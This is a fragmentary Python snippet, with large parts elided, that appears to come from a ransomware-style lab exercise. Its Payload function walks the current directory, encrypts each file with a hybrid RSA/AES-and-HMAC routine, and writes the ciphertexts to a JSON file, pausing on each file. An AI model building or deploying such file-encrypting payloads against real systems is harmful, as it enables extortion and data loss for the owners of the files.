...
#generate keys if not in directory
def KeyHolder():
...
def Payload():
    ...
    f = open('Encrypted_JSON.json','wb')
    with os.scandir('.') as it:
        for entry in it:
            if not entry.name.startswith('.') and entry.is_file():
                if(entry.name != 'private_key.pem' and entry.name != 'Encrypted_JSON.json'):
                    print(entry)
                    input()
                    RSAcipher,ct,IV,tag,ext = MyRSAEncryptMAC(entry.name,public_key)
                    print(json.dumps({'File Name':entry.name, 'RSACipher': RSAcipher, 'Cipher Text': ct, 'IV':IV, 'HMAC Tag': tag, 'File Extension':ext}, indent=4))
                    f.write(json.dumps({'File Name':entry.name, 'RSACipher': RSAcipher, 'Cipher Text': ct, 'IV':IV, 'HMAC Tag': tag, 'File Extension':ext}, indent=4))
